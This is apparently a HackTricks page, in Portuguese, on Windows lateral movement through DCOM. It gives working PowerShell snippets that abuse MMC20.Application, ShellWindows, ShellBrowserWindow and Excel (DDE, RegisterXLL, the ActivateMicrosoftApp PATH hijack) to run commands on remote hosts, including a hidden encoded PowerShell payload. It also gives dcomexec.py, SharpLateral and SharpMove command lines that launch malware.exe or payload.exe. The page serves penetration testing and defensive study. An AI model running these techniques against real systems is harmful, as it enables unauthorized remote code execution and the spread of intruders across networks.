# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

O lateral movement via DCOM é atrativo porque reutiliza servidores COM existentes expostos por RPC/DCOM, em vez de criar um serviço ou uma tarefa agendada. Na prática, isso significa que a conexão inicial geralmente começa na TCP/135 e depois passa para portas RPC altas atribuídas dinamicamente.

## Pré-requisitos e pontos importantes

- Normalmente, é necessário um contexto de administrador local no alvo, e o servidor COM remoto deve permitir o lançamento/ativação remota.
- Desde **14 de março de 2023**, a Microsoft aplica o hardening do DCOM nos sistemas compatíveis. Clientes antigos que solicitam um nível baixo de autenticação de ativação podem falhar, a menos que negociem pelo menos `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Os clientes Windows modernos geralmente têm o nível elevado automaticamente, portanto as ferramentas atuais normalmente continuam funcionando.<sup>[[3]](#references)</sup>
- A execução manual ou por scripts via DCOM geralmente requer TCP/135, além do intervalo de portas RPC dinâmicas do alvo. Se você estiver usando o `dcomexec.py` do Impacket e quiser receber a saída dos comandos, normalmente também precisará de acesso SMB ao `ADMIN$` (ou a outro compartilhamento com permissões de leitura/escrita).
- Se o RPC/DCOM funcionar, mas o SMB estiver bloqueado, `dcomexec.py -nooutput` ainda poderá ser útil para execução às cegas.

Verificações rápidas:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Para obter mais informações sobre esta técnica, consulte o [post original sobre MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Os objetos Distributed Component Object Model (DCOM) oferecem um recurso interessante para interações baseadas em rede com objetos. A Microsoft fornece documentação abrangente sobre DCOM e Component Object Model (COM), acessível [aqui para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [aqui para COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Uma lista de aplicações DCOM pode ser obtida usando o comando do PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
O objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite a criação de scripts para operações de snap-ins do MMC. Notavelmente, esse objeto contém um método `ExecuteShellCommand` em `Document.ActiveView`. Mais informações sobre esse método podem ser encontradas [aqui](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Verifique executando-o:<sup>[[6]](#references)</sup>

Esse recurso facilita a execução de comandos pela rede por meio de uma aplicação DCOM. Para interagir remotamente com DCOM como administrador, o PowerShell pode ser utilizado da seguinte forma:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando conecta-se à aplicação DCOM e retorna uma instância do objeto COM. O método ExecuteShellCommand pode então ser invocado para executar um processo no host remoto. O processo envolve as seguintes etapas:

Verificar métodos:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obter RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
O último argumento é o estilo da janela. `7` mantém a janela minimizada. Operacionalmente, a execução baseada em MMC geralmente faz com que um processo remoto `mmc.exe` gere seu payload, o que é diferente dos objetos baseados no Explorer abaixo.

## ShellWindows & ShellBrowserWindow

**Para obter mais informações sobre essa técnica, consulte o post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Foi identificado que o objeto **MMC20.Application** não possui "LaunchPermissions" explícitas, usando por padrão permissões que permitem o acesso de Administrators. Para obter mais detalhes, consulte a discussão [aqui](https://twitter.com/tiraniddo/status/817532039771525120); também é recomendado usar o OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) para filtrar objetos sem Launch Permission explícita.

Dois objetos específicos, `ShellBrowserWindow` e `ShellWindows`, foram destacados devido à ausência de Launch Permissions explícitas. A ausência de uma entrada de registro `LaunchPermission` em `HKCR:\AppID\{guid}` indica que não há permissões explícitas.

Em comparação com `MMC20.Application`, esses objetos costumam ser mais discretos do ponto de vista de OPSEC, pois o comando geralmente acaba como um processo filho de `explorer.exe` no host remoto, em vez de `mmc.exe`.

### ShellWindows

Para `ShellWindows`, que não possui um ProgID, os métodos .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitam a instanciação do objeto usando seu AppID. Esse processo utiliza o OleView .NET para recuperar o CLSID de `ShellWindows`. Depois de instanciado, é possível interagir por meio do método `WindowsShell.Item`, levando à invocação de métodos como `Document.Application.ShellExecute`.

Foram fornecidos comandos PowerShell de exemplo para instanciar o objeto e executar comandos remotamente:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` é semelhante, mas você pode instanciá-lo diretamente por meio de seu CLSID e fazer pivot para `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement com objetos DCOM do Excel

O lateral movement pode ser obtido explorando objetos DCOM do Excel. Para obter informações detalhadas, recomenda-se ler a discussão sobre como aproveitar o Excel DDE para lateral movement via DCOM no [blog da Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

O projeto Empire fornece um script PowerShell que demonstra a utilização do Excel para execução remota de código (RCE) por meio da manipulação de objetos DCOM. Abaixo estão trechos do script disponível no [repositório do Empire no GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), mostrando diferentes métodos para abusar do Excel para RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Pesquisas recentes expandiram esta área com o método `ActivateMicrosoftApp()` do `Excel.Application`. A ideia principal é que o Excel pode tentar iniciar aplicativos Microsoft legados, como FoxPro, Schedule Plus ou Project, pesquisando no `PATH` do sistema. Se um operador puder colocar um payload com um desses nomes esperados em um local com permissão de escrita que faça parte do `PATH` do alvo, o Excel o executará.<sup>[[4]](#references)</sup>

Requisitos para esta variação:

- Administrador local no alvo
- Excel instalado no alvo
- Capacidade de gravar um payload em um diretório com permissão de escrita no `PATH` do alvo

Exemplo prático abusando da pesquisa do FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Se o host atacante não tiver o ProgID local `Excel.Application` registrado, instancie o objeto remoto usando o CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Valores observados sendo abusados na prática:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Ferramentas de automação para Lateral Movement

Duas ferramentas são destacadas para automatizar essas técnicas:

- **Invoke-DCOM.ps1**: Um script PowerShell fornecido pelo projeto Empire que simplifica a invocação de diferentes métodos para executar código em máquinas remotas. Esse script está disponível no repositório do Empire no GitHub.

- **SharpLateral**: Uma ferramenta projetada para executar código remotamente, que pode ser usada com o comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Ferramentas Automáticas

- O script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permite invocar facilmente todas as formas comentadas de executar código em outras máquinas.
- Você pode usar o `dcomexec.py` do Impacket para executar comandos em sistemas remotos usando DCOM. As versões atuais oferecem suporte a `ShellWindows`, `ShellBrowserWindow` e `MMC20`, usando `ShellWindows` por padrão.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Você também poderia usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Você também pode usar [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Movimento lateral usando o objeto COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Movimento lateral via DCOM: Rodada 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Gerenciar alterações para a violação do recurso de segurança do Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Movimento lateral: explorar o poder do DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Explorando o Excel DDE para movimento lateral via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Classe de aplicativo MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
